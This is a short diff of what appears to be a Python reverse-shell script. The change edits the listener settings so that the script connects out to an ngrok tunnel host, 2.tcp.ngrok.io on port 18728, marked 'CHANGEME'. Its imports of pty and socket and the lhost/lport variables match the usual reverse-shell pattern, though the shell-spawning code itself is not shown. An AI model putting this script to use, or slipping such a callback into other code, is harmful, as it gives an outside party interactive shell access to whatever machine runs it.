@@ -14,8 +14,8 @@ import os
 import pty
 import socket
 
-lhost = "tcp://2.tcp.ngrok.io:18728" # XXX: CHANGEME
-lport = 31337 # XXX: CHANGEME
+lhost = "2.tcp.ngrok.io" # XXX: CHANGEME
+lport = 18728 # XXX: CHANGEME
 
 def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
